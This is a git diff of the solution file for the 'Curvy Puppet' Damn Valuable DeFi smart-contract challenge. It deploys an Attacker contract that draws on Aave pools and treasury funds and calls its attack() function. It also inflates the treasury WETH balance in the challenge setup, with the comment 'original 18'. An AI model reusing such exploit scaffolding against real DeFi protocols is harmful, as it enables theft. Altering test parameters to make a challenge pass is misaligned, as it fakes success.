@@ -9,6 +9,9 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
+import {DataTypes} from "lib/aave-v3-core/contracts/protocol/libraries/types/DataTypes.sol";
+import {IPool} from "lib/aave-v3-core/contracts/interfaces/IPool.sol";
+import {Attacker} from "./Attacker.sol";
 
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -28,7 +31,7 @@ contract CurvyPuppetChallenge is Test {
     IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
     WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
 
-    uint256 constant TREASURY_WETH_BALANCE = 200e18;
+    uint256 constant TREASURY_WETH_BALANCE = 2e24; // original 18
     uint256 constant TREASURY_LP_BALANCE = 65e17;
     uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
     uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
@@ -158,8 +161,14 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
-    }
+        // console.log(address(weth).balance);
+        address v2Pool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
+        address v3Pool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; 
+        Attacker attacker = new Attacker(v2Pool, v3Pool, IERC20(curvePool.lp_token()), curvePool, lending, weth, stETH, [alice, bob, charlie], address(permit2), address(dvt), treasury);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attacker), TREASURY_LP_BALANCE-1);
+        weth.transferFrom(treasury, address(attacker), TREASURY_WETH_BALANCE-1);
+        attacker.attack();
+    }   
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
